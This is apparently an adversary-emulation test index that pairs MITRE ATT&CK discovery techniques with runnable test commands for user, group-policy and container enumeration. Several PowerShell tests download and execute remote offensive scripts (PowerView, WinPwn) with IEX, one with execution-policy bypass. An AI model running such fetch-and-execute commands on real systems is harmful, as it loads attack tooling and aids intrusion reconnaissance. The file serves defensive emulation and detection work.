discovery:
  T1033:
    technique:
      modified: '2023-04-12T23:35:40.261Z'
      name: System Owner/User Discovery
      description: |-
        Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

        Various utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.

        On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - Austin Clark, @c2defense
      x_mitre_deprecated: false
      x_mitre_detection: |-
        `System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

        For network infrastructure devices, collect AAA logging to monitor `show` commands being run by non-standard users from non-standard locations.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      x_mitre_version: '1.4'
      x_mitre_data_sources:
      - 'Process: OS API Execution'
      - 'Process: Process Access'
      - 'Windows Registry: Windows Registry Key Access'
      - 'Active Directory: Active Directory Object Access'
      - 'Network Traffic: Network Traffic Content'
      - 'File: File Access'
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      - 'Network Traffic: Network Traffic Flow'
      type: attack-pattern
      id: attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104
      created: '2017-05-31T21:30:35.733Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1033
        external_id: T1033
      - source_name: show_ssh_users_cmd_cisco
        description: 'Cisco. (2023, March 7). Cisco IOS Security Command Reference:
          Commands S to Z . Retrieved July 13, 2022.'
        url: https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/security/s1/sec-s1-cr-book/sec-cr-s5.html
      - source_name: US-CERT TA18-106A Network Infrastructure Devices 2018
        description: US-CERT. (2018, April 20). Russian State-Sponsored Cyber Actors
          Targeting Network Infrastructure Devices. Retrieved October 19, 2020.
        url: https://us-cert.cisa.gov/ncas/alerts/TA18-106A
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1033
    atomic_tests:
    - name: System Owner/User Discovery
      auto_generated_guid: 4c4959bf-addf-4b4a-be86-8d09cc1857aa
      description: "Identify System owner or users on an endpoint.\n\nUpon successful
        execution, cmd.exe will spawn multiple commands against a target host to identify
        usernames. Output will be via stdout. \nAdditionally, two files will be written
        to disk - computers.txt and usernames.txt.\n"
      supported_platforms:
      - windows
      input_arguments:
        computer_name:
          description: Name of remote computer
          type: string
          default: localhost
      executor:
        command: |
          cmd.exe /C whoami
          wmic useraccount get /ALL
          quser /SERVER:"#{computer_name}"
          quser
          qwinsta.exe /server:#{computer_name}
          qwinsta.exe
          for /F "tokens=1,2" %i in ('qwinsta /server:#{computer_name} ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > computers.txt
          @FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
        name: command_prompt
    - name: System Owner/User Discovery
      auto_generated_guid: 2a9b677d-a230-44f4-ad86-782df1ef108c
      description: |
        Identify System owner or users on an endpoint

        Upon successful execution, sh will stdout list of usernames.
      supported_platforms:
      - linux
      - macos
      executor:
        command: |
          users
          w
          who
        name: sh
    - name: Find computers where user has session - Stealth mode (PowerView)
      auto_generated_guid: 29857f27-a36f-4f7e-8084-4557cd6207ca
      description: Find existing user session on other computers. Upon execution,
        information about any sessions discovered will be displayed.
      supported_platforms:
      - windows
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose
        name: powershell
    - name: User Discovery With Env Vars PowerShell Script
      auto_generated_guid: dcb6cdee-1fb0-4087-8bf8-88cfd136ba51
      description: Use the PowerShell environment variables to identify the current
        logged user.
      supported_platforms:
      - windows
      executor:
        command: "[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt
          \n$env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append\n"
        cleanup_command: 'Remove-Item -Path .\CurrentactiveUser.txt -Force

          '
        name: powershell
    - name: GetCurrent User with PowerShell Script
      auto_generated_guid: 1392bd0f-5d5a-429e-81d9-eb9d4d4d5b3b
      description: Use the PowerShell "GetCurrent" method of the WindowsIdentity .NET
        class to identify the logged user.
      supported_platforms:
      - windows
      executor:
        command: "[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File
          -FilePath .\\CurrentUserObject.txt\n"
        cleanup_command: 'Remove-Item -Path .\CurrentUserObject.txt -Force

          '
        name: powershell
    - name: System Discovery - SocGholish whoami
      auto_generated_guid: 3d257a03-eb80-41c5-b744-bb37ac7f65c7
      description: "SocGholish performs whoami discovery commands and outputs the
        results to a tmp file. \nThe test will generate a filename similar to the
        random one generated during execution and write the file to AppData\\Temp.\n\nReference:
        https://redcanary.com/threat-detection-report/threats/socgholish/\n"
      supported_platforms:
      - windows
      input_arguments:
        output_path:
          description: Location of output file
          type: string
          default: "$env:temp"
      executor:
        command: |
          $TokenSet = @{
            U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
            N = [Char[]]'0123456789'
          }
          $Upper = Get-Random -Count 5 -InputObject $TokenSet.U
          $Number = Get-Random -Count 5 -InputObject $TokenSet.N
          $StringSet = $Upper + $Number
          $rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''
          $file = "rad" + $rad + ".tmp"

          whoami.exe /all >> #{output_path}\$file
        cleanup_command: 'Remove-Item -Path #{output_path}\rad*.tmp -Force

          '
        name: powershell
  T1613:
    technique:
      modified: '2023-04-15T16:08:50.706Z'
      name: Container and Resource Discovery
      description: "Adversaries may attempt to discover containers and other resources
        that are available within a containers environment. Other resources may include
        images, deployments, pods, nodes, and other information such as the status
        of a cluster.\n\nThese resources can be viewed within web applications such
        as the Kubernetes dashboard or can be queried via the Docker and Kubernetes
        APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may
        leak information about the environment, such as the environment’s configuration,
        which services are available, and what cloud provider the victim may be utilizing.
        The discovery of these resources may inform an adversary’s next steps in the
        environment, such as how to perform lateral movement and which methods to
        utilize for execution. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - Vishwas Manral, McAfee
      - Center for Threat-Informed Defense (CTID)
      - Yossi Weizman, Azure Defender Research Team
      x_mitre_deprecated: false
      x_mitre_detection: "Establish centralized logging for the activity of container
        and Kubernetes cluster components. This can be done by deploying logging agents
        on Kubernetes nodes and retrieving logs from sidecar proxies for application
        pods to detect malicious activity at the cluster level.\n\nMonitor logs for
        actions that could be taken to gather information about container infrastructure,
        including the use of discovery API calls by new or unexpected users. Monitor
        account activity logs to see actions performed and activity associated with
        the Kubernetes dashboard and other web applications. "
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Containers
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Container: Container Enumeration'
      - 'Pod: Pod Enumeration'
      type: attack-pattern
      id: attack-pattern--0470e792-32f8-46b0-a351-652bc35e9336
      created: '2021-03-31T14:26:00.848Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1613
        external_id: T1613
      - source_name: Docker API
        description: Docker. (n.d.). Docker Engine API v1.41 Reference. Retrieved
          March 31, 2021.
        url: https://docs.docker.com/engine/api/v1.41/
      - source_name: Kubernetes API
        description: The Kubernetes Authors. (n.d.). The Kubernetes API. Retrieved
          March 29, 2021.
        url: https://kubernetes.io/docs/concepts/overview/kubernetes-api/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1613
    atomic_tests:
    - name: Container and ResourceDiscovery
      auto_generated_guid: 8a895923-f99f-4668-acf2-6cc59a44f05e
      description: Adversaries may attempt to discover containers and other resources
        that are available within a containers environment.
      supported_platforms:
      - containers
      dependency_executor_name: sh
      dependencies:
      - description: Verify docker is installed.
        prereq_command: 'which docker

          '
        get_prereq_command: 'if [ "" == "`which docker`" ]; then echo "Docker Not
          Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker
          ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else
          echo "Docker installed"; fi

          '
      - description: Verify docker service is running.
        prereq_command: 'sudo systemctl status docker  --no-pager

          '
        get_prereq_command: 'sudo systemctl start docker

          '
      executor:
        command: |-
          docker build -t t1613  $PathtoAtomicsFolder/T1613/src/
          docker run --name t1613_container  -d -t t1613
          docker ps
          docker stats --no-stream
          docker inspect $(docker ps -l -q --filter ancestor=t1613)
        cleanup_command: |-
          docker stop t1613_container
          docker rmi -f t1613_container
        name: sh
  T1016.001:
    technique:
      x_mitre_platforms:
      - Windows
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--132d5b37-aac5-4378-a8dc-3127b18a73dc
      type: attack-pattern
      created: '2021-03-17T15:28:10.689Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1016.001
        url: https://attack.mitre.org/techniques/T1016/001
      modified: '2021-03-25T17:03:26.632Z'
      name: Internet Connection Discovery
      description: |-
        Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping](https://attack.mitre.org/software/S0097), <code>tracert</code>, and GET requests to websites.

        Adversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Command and Control, based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to check Internet connectivity.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      x_mitre_permissions_required:
      - User
    atomic_tests: []
  T1069:
    technique:
      modified: '2023-04-15T17:26:53.365Z'
      name: Permission Groups Discovery
      description: |-
        Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.

        Adversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.(Citation: CrowdStrike BloodHound April 2018)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - Daniel Prizmant, Palo Alto Networks
      - Yuval Avrahami, Palo Alto Networks
      - Microsoft Threat Intelligence Center (MSTIC)
      x_mitre_deprecated: false
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). Monitor container logs for commands and/or API calls related to listing permissions for pods and nodes, such as <code>kubectl auth can-i</code>.(Citation: K8s Authorization Overview)
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Google Workspace
      - Containers
      x_mitre_version: '2.5'
      x_mitre_data_sources:
      - 'Group: Group Enumeration'
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      - 'Group: Group Metadata'
      - 'Application Log: Application Log Content'
      type: attack-pattern
      id: attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce
      created: '2017-05-31T21:30:55.471Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1069
        external_id: T1069
      - source_name: K8s Authorization Overview
        description: Kubernetes. (n.d.). Authorization Overview. Retrieved June 24,
          2021.
        url: https://kubernetes.io/docs/reference/access-authn-authz/authorization/
      - source_name: CrowdStrike BloodHound April 2018
        description: 'Red Team Labs. (2018, April 24). Hidden Administrative Accounts:
          BloodHound to the Rescue. Retrieved October 28, 2020.'
        url: https://www.crowdstrike.com/blog/hidden-administrative-accounts-bloodhound-to-the-rescue/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1069.003:
    technique:
      modified: '2023-03-21T13:33:40.625Z'
      name: Cloud Groups
      description: |-
        Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.

        With authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts (Citation: Microsoft Msolrole)(Citation: GitHub Raindance).

        Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API Documentation) In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies` allow users to enumerate the policies attached to a role.(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)

        Adversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API (Citation: AWS Get Bucket ACL). Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - Regina Elwell
      - Isif Ibrahima, Mandiant
      x_mitre_deprecated: false
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Activity and account logs for the cloud services can also be monitored for suspicious commands that are anomalous compared to a baseline of normal activity.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Google Workspace
      x_mitre_version: '1.4'
      x_mitre_data_sources:
      - 'Group: Group Enumeration'
      - 'Application Log: Application Log Content'
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      - 'Group: Group Metadata'
      type: attack-pattern
      id: attack-pattern--16e94db9-b5b1-4cd0-b851-f38fbd0a70f2
      created: '2020-02-21T21:15:33.222Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1069/003
        external_id: T1069.003
      - source_name: AWS Get Bucket ACL
        description: Amazon Web Services. (n.d.). Retrieved May 28, 2021.
        url: https://docs.aws.amazon.com/AmazonS3/latest/API/API_GetBucketAcl.html
      - source_name: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022
        description: 'Dror Alon. (2022, December 8). Compromised Cloud Compute Credentials:
          Case Studies From the Wild. Retrieved March 9, 2023.'
        url: https://unit42.paloaltonetworks.com/compromised-cloud-compute-credentials/
      - source_name: Black Hills Red Teaming MS AD Azure, 2018
        description: Felch, M.. (2018, August 31). Red Teaming Microsoft Part 1 Active
          Directory Leaks via Azure. Retrieved October 6, 2019.
        url: https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/
      - source_name: Google Cloud Identity API Documentation
        description: Google. (n.d.). Retrieved March 16, 2021.
        url: https://cloud.google.com/identity/docs/reference/rest
      - source_name: Microsoft AZ CLI
        description: Microsoft. (n.d.). az ad user. Retrieved October 6, 2019.
        url: https://docs.microsoft.com/en-us/cli/azure/ad/user?view=azure-cli-latest
      - source_name: Microsoft Msolrole
        description: Microsoft. (n.d.). Get-MsolRole. Retrieved October 6, 2019.
        url: https://docs.microsoft.com/en-us/powershell/module/msonline/get-msolrole?view=azureadps-1.0
      - source_name: GitHub Raindance
        description: Stringer, M.. (2018, November 21). RainDance. Retrieved October
          6, 2019.
        url: https://github.com/True-Demon/raindance
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1615:
    technique:
      modified: '2023-01-06T12:41:08.579Z'
      name: Group Policy Discovery
      description: |-
        Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)

        Adversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

        Monitor for suspicious use of <code>gpresult</code>. Monitor for the use of PowerShell functions such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code> and processes spawning with command-line arguments containing <code>GPOLocalGroup</code>.

        Monitor for abnormal LDAP queries with filters for <code>groupPolicyContainer</code> and high volumes of LDAP traffic to domain controllers. Windows Event ID 4661 can also be used to detect when a directory service has been accessed.
      x_mitre_platforms:
      - Windows
      x_mitre_is_subtechnique: false
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '1.1'
      x_mitre_contributors:
      - Ted Samuels, Rapid7
      - Jonhnathan Ribeiro, 3CORESec, @_w0rk3r
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      - 'Active Directory: Active Directory Object Access'
      - 'Script: Script Execution'
      - 'Network Traffic: Network Traffic Content'
      type: attack-pattern
      id: attack-pattern--1b20efbf-8063-4fc3-a07d-b575318a301b
      created: '2021-08-06T13:10:12.916Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1615
        external_id: T1615
      - source_name: ADSecurity GPO Persistence 2016
        description: 'Metcalf, S. (2016, March 14). Sneaky Active Directory Persistence
          #17: Group Policy. Retrieved March 5, 2019.'
        url: https://adsecurity.org/?p=2716
      - source_name: Microsoft gpresult
        description: Microsoft. (2017, October 16). gpresult. Retrieved August 6,
          2021.
        url: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult
      - source_name: Github PowerShell Empire
        description: Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire.
          Retrieved April 28, 2016.
        url: https://github.com/PowerShellEmpire/Empire
      - source_name: TechNet Group Policy Basics
        description: 'srachui. (2012, February 13). Group Policy Basics – Part 1:
          Understanding the Structure of a Group Policy Object. Retrieved March 5,
          2019.'
        url: https://blogs.technet.microsoft.com/musings_of_a_technical_tam/2012/02/13/group-policy-basics-part-1-understanding-the-structure-of-a-group-policy-object/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1615
    atomic_tests:
    - name: Display group policy information via gpresult
      auto_generated_guid: '0976990f-53b1-4d3f-a185-6df5be429d3b'
      description: |
        Uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information for a remote user and computer
        The /z parameter displays all available information about Group Policy. More parameters can be found in the linked Microsoft documentation
        https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult
        https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/
        Turla has used the /z and /v parameters: https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf
      supported_platforms:
      - windows
      executor:
        name: command_prompt
        elevation_required: false
        command: 'gpresult /z

          '
    - name: Get-DomainGPO to display group policy information via PowerView
      auto_generated_guid: 4e524c4e-0e02-49aa-8df5-93f3f7959b9f
      description: Use PowerView to Get-DomainGPO This will only work on Windows 10
        Enterprise and A DC Windows 2019.
      supported_platforms:
      - windows
      executor:
        command: powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1');
          Get-DomainGPO"
        name: powershell
        elevation_required: true
    - name: WinPwn - GPOAudit
      auto_generated_guid: bc25c04b-841e-4965-855f-d1f645d7ab73
      description: Check domain Group policies for common misconfigurations using
        Grouper2 via GPOAudit function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          GPOAudit -noninteractive -consoleoutput
        name: powershell
    - name: WinPwn - GPORemoteAccessPolicy
      auto_generated_guid: 7230d01a-0a72-4bd5-9d7f-c6d472bc6a59
      description: Enumerate remote access policies through group policy using GPORemoteAccessPolicy
        function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          GPORemoteAccessPolicy -consoleoutput -noninteractive
        name: powershell
    - name: MSFT Get-GPO Cmdlet
      auto_generated_guid: 52778a8f-a10b-41a4-9eae-52ddb74072bf
      description: 'The Get-GPO cmdlet gets one Group Policy Object (GPO) or all the
        GPOs in a domain. Tested on Windows Server 2019 as a domain user with computer
        joined to domain. Reference: https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps'
      supported_platforms:
      - windows
      input_arguments:
        gpo_output:
          description: The output of the Get-GPO cmdlet
          type: string
          default: "$env:temp\\GPO_Output.txt"
        gpo_param:
          description: You can specify a GPO by its display name or by its globally
            unique identifier (GUID) to get a single GPO, or you can get all the GPOs
            in the domain through the All parameter
          type: string
          default: "-All"
      dependency_executor_name: powershell
      dependencies:
      - description: Add Rsat.ActiveDirectory.DS
        prereq_command: if(Get-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0
          | Where-Object { $_.State -eq 'Installed' }){ exit 0 } else { exit 1 }
        get_prereq_command: Add-WindowsCapability -online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0
      - description: 'Add Rsat.GroupPolicy.Management.Tools ###Two RSAT Modules needed
          for this to work on Win10, WinServer 2019 works by default. This will take
          a long time (almost 2 minutes) to install RSAT Manually###.'
        prereq_command: if(Get-WindowsCapability -Online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0
          | Where-Object { $_.State -eq 'Installed' }){ exit 0 } else { exit 1 }
        get_prereq_command: Add-WindowsCapability -online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0
      executor:
        command: 'Get-GPO -Domain $ENV:userdnsdomain #{gpo_param} >> #{gpo_output}'
        cleanup_command: del $env:temp\GPO_Output.txt -erroraction silentlycontinue
        name: powershell
        elevation_required: true
  T1652:
    technique:
      modified: '2023-05-04T18:07:16.804Z'
      name: Device Driver Discovery
      description: |-
        Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) or other defenses (e.g., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)), as well as potential exploitable vulnerabilities (e.g., [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)).

        Many OS utilities may provide information about local device drivers, such as `driverquery.exe` and the `EnumDeviceDrivers()` API function on Windows.(Citation: Microsoft Driverquery)(Citation: Microsoft EnumDeviceDrivers) Information about device drivers (as well as associated services, i.e., [System Service Discovery](https://attack.mitre.org/techniques/T1007)) may also be available in the Registry.(Citation: Microsoft Registry Drivers)

        On Linux/macOS, device drivers (in the form of kernel modules) may be visible within `/dev` or using utilities such as `lsmod` and `modinfo`.(Citation: Linux Kernel Programming)(Citation: lsmod man)(Citation: modinfo man)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - ESET
      x_mitre_deprecated: false
      x_mitre_detection: ''
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.0'
      x_mitre_data_sources:
      - 'Windows Registry: Windows Registry Key Access'
      - 'Process: OS API Execution'
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      type: attack-pattern
      id: attack-pattern--215d9700-5881-48b8-8265-6449dbb7195d
      created: '2023-03-28T20:14:49.087Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1652
        external_id: T1652
      - source_name: lsmod man
        description: Kerrisk, M. (2022, December 18). lsmod(8) — Linux manual page.
          Retrieved March 28, 2023.
        url: https://man7.org/linux/man-pages/man8/lsmod.8.html
      - source_name: Microsoft Registry Drivers
        description: Microsoft. (2021, December 14). Registry Trees for Devices and
          Drivers. Retrieved March 28, 2023.
        url: https://learn.microsoft.com/windows-hardware/drivers/install/overview-of-registry-trees-and-keys
      - source_name: Microsoft EnumDeviceDrivers
        description: Microsoft. (2021, October 12). EnumDeviceDrivers function (psapi.h).
          Retrieved March 28, 2023.
        url: https://learn.microsoft.com/windows/win32/api/psapi/nf-psapi-enumdevicedrivers
      - source_name: Microsoft Driverquery
        description: Microsoft. (n.d.). driverquery. Retrieved March 28, 2023.
        url: https://learn.microsoft.com/windows-server/administration/windows-commands/driverquery
      - source_name: Linux Kernel Programming
        description: Pomerantz, O., Salzman, P.. (2003, April 4). The Linux Kernel
          Module Programming Guide. Retrieved April 6, 2018.
        url: https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf
      - source_name: modinfo man
